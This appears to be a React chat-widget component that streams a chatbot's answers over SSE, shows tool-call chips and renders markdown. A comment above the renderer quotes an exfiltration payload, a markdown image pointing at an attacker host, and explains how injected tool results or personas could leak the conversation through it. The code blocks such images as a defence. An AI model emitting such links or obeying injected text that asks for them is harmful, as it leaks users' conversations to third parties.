"use client";

// The chat client: fetch-POST + SSE reader (EventSource can't POST), thinking dots,
// live tool chips, markdown answers. Ported from the previous project's React UI,
// trimmed to a single tenant.

import { useEffect, useRef, useState } from "react";
import ReactMarkdown from "react-markdown";

// Everything tenant-specific arrives as props now; tool labels come down the SSE stream
// with each `tool` event, so this file knows nothing about which tools exist.
export interface ChatPanelProps {
  embedKey: string;
  title?: string;
  subtitle?: string;
  placeholder?: string;
  suggestions?: string[];
  /** Privacy/scope notice rendered under the composer; hidden when empty. */
  disclaimer?: string;
  /** Model alias shown in the footer ("AI model: …"); hidden when empty. */
  modelLabel?: string;
}

interface ToolCall {
  label: string;
}

interface Turn {
  id: number;
  role: "user" | "assistant";
  text: string;
  tools: ToolCall[];
  phase: "thinking" | "answering" | "done" | "error";
  meta?: { latencyMs: number; inTokens: number; outTokens: number };
}

let nextId = 1;

export function ChatPanel({
  embedKey,
  title = "Chat with us",
  subtitle = "Ask about the menu, the weather, or what to try. Answers come from live data.",
  placeholder = "Send a message…",
  suggestions = [],
  disclaimer,
  modelLabel,
}: ChatPanelProps) {
  const [turns, setTurns] = useState<Turn[]>([]);
  const [input, setInput] = useState("");
  const [busy, setBusy] = useState(false);
  const conversationRef = useRef<string | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);
  const chipsRef = useRef<HTMLDivElement>(null);
  // Keyed by embed key so two tenants sharing an origin never see each other's session.
  const sessionStorageKey = `michi.session.${embedKey}`;

  useEffect(() => {
    scrollRef.current?.scrollTo({ top: scrollRef.current.scrollHeight, behavior: "smooth" });
  }, [turns]);

  function patchLast(patch: (t: Turn) => Turn) {
    setTurns((prev) => {
      const next = [...prev];
      next[next.length - 1] = patch(next[next.length - 1]);
      return next;
    });
  }

  async function send(text: string) {
    const message = text.trim();
    if (!message || busy) return;

    setBusy(true);
    setInput("");
    setTurns((prev) => [
      ...prev,
      { id: nextId++, role: "user", text: message, tools: [], phase: "done" },
      { id: nextId++, role: "assistant", text: "", tools: [], phase: "thinking" },
    ]);

    try {
      const headers: Record<string, string> = {
        "Content-Type": "application/json",
        "X-Embed-Key": embedKey,
      };
      // Server-issued, unlike the anon id it replaced. Scoped to one tenant and revocable.
      const session = localStorage.getItem(sessionStorageKey);
      if (session) headers["X-Michi-Session"] = session;

      const response = await fetch("/api/chat", {
        method: "POST",
        headers,
        body: JSON.stringify({ message, conversationId: conversationRef.current }),
      });
      if (!response.ok || !response.body) {
        // Read the JSON reason (bad key, disallowed origin, daily cap) instead of showing
        // a generic failure. This is why the API attaches CORS headers to its errors.
        const reason = await response
          .json()
          .then((b) => (typeof b?.error === "string" ? b.error : null))
          .catch(() => null);
        throw new Error(reason ?? `chat failed (${response.status})`);
      }

      const reader = response.body.getReader();
      const decoder = new TextDecoder();
      let buffer = "";
      for (;;) {
        const { done, value } = await reader.read();
        if (done) break;
        buffer += decoder.decode(value, { stream: true });

        let sep;
        while ((sep = buffer.indexOf("\n\n")) >= 0) {
          const frame = buffer.slice(0, sep);
          buffer = buffer.slice(sep + 2);
          let eventType = "message";
          let data = "";
          for (const line of frame.split("\n")) {
            if (line.startsWith("event: ")) eventType = line.slice(7).trim();
            else if (line.startsWith("data: ")) data += line.slice(6);
          }
          if (!data) continue;
          const payload = JSON.parse(data);

          if (eventType === "tool") {
            patchLast((t) => ({
              ...t,
              tools: [...t.tools, { label: payload.label ?? payload.name }],
            }));
          } else if (eventType === "delta") {
            patchLast((t) => ({ ...t, phase: "answering", text: t.text + payload.text }));
          } else if (eventType === "done") {
            conversationRef.current = payload.conversationId;
            // Only sent on the turn that minted the session.
            if (payload.sessionToken) {
              localStorage.setItem(sessionStorageKey, payload.sessionToken);
            }
            patchLast((t) => ({
              ...t,
              phase: "done",
              meta: { latencyMs: payload.latencyMs, ...payload.usage },
            }));
          } else if (eventType === "error") {
            patchLast((t) => ({ ...t, phase: "error", text: payload.message }));
          }
        }
      }
    } catch {
      patchLast((t) => ({
        ...t,
        phase: "error",
        text: "Could not reach the chat service. Is docker compose up?",
      }));
    } finally {
      setBusy(false);
    }
  }

  const empty = turns.length === 0;

  return (
    <div className="panel">
      <div className="messages" ref={scrollRef}>
        {empty && (
          <div className="empty">
            <div className="empty-mark" aria-hidden>
              ●
            </div>
            <h2>{title}</h2>
            <p>{subtitle}</p>
            <div className="suggestions">
              {suggestions.map((s) => (
                <button key={s} className="suggestion" onClick={() => void send(s)}>
                  {s}
                </button>
              ))}
            </div>
          </div>
        )}

        {turns.map((turn) =>
          turn.role === "user" ? (
            <div key={turn.id} className="row user">
              <div className="bubble user">{turn.text}</div>
            </div>
          ) : (
            <div key={turn.id} className="row bot">
              <div className="bot-block">
                {turn.tools.length > 0 && (
                  <div className="tool-chips">
                    {turn.tools.map((tool, i) => {
                      const running = turn.phase === "thinking" && i === turn.tools.length - 1;
                      return (
                        <span key={i} className={"tool-chip" + (running ? " running" : "")}>
                          {running ? (
                            <span className="spinner" aria-hidden />
                          ) : (
                            <span className="tick" aria-hidden>
                              ✓
                            </span>
                          )}
                          {tool.label}
                        </span>
                      );
                    })}
                  </div>
                )}
                {turn.phase === "thinking" && (
                  <div className="bubble bot thinking" aria-label="Michi is thinking">
                    <span className="dot" />
                    <span className="dot" />
                    <span className="dot" />
                  </div>
                )}
                {turn.phase === "error" && <div className="bubble bot error">{turn.text}</div>}
                {(turn.phase === "answering" || turn.phase === "done") && (
                  <div className="bubble bot">
                    <div className="md">
                      {/* skipHtml stops raw HTML, but NOT markdown images. An image is
                          fetched with no click, so `![](https://attacker/?c=...)` in a
                          tool result or persona would exfiltrate the conversation. The
                          bot has no reason to emit images, so drop them entirely. */}
                      <ReactMarkdown skipHtml disallowedElements={["img"]}>
                        {turn.text}
                      </ReactMarkdown>
                    </div>
                  </div>
                )}
                {turn.phase === "done" && turn.meta && (
                  <div className="meta">
                    {(turn.meta.latencyMs / 1000).toFixed(1)}s · {turn.meta.inTokens}→
                    {turn.meta.outTokens} tokens
                  </div>
                )}
              </div>
            </div>
          ),
        )}
      </div>

      {!empty && suggestions.length > 0 && (
        // The chips return after the first message as an arrowed carousel, so a visitor
        // is never stranded wondering what else they can ask.
        <div className="chips-carousel">
          <button
            type="button"
            className="chips-arrow"
            aria-label="Scroll suggestions left"
            onClick={() => chipsRef.current?.scrollBy({ left: -180, behavior: "smooth" })}
          >
            ‹
          </button>
          <div className="suggestions suggestions-compact" ref={chipsRef}>
            {suggestions.map((s) => (
              <button key={s} className="suggestion" onClick={() => void send(s)} disabled={busy}>
                {s}
              </button>
            ))}
          </div>
          <button
            type="button"
            className="chips-arrow"
            aria-label="Scroll suggestions right"
            onClick={() => chipsRef.current?.scrollBy({ left: 180, behavior: "smooth" })}
          >
            ›
          </button>
        </div>
      )}

      <form
        className="composer"
        onSubmit={(e) => {
          e.preventDefault();
          void send(input);
        }}
      >
        <input
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder={placeholder}
          aria-label="Your message"
          disabled={busy}
          autoFocus
        />
        <button type="submit" disabled={busy || !input.trim()}>
          {busy ? "…" : "Send"}
        </button>
      </form>
      {disclaimer && (
        <p className="disclaimer" role="note">
          {disclaimer}
        </p>
      )}
      <p className="credit">
        <a href="https://beany-vu.github.io/michi-chat/" target="_blank" rel="noopener noreferrer">
          Powered by michi-chat
        </a>
        {modelLabel && <> · AI model: {modelLabel}</>}
      </p>
    </div>
  );
}
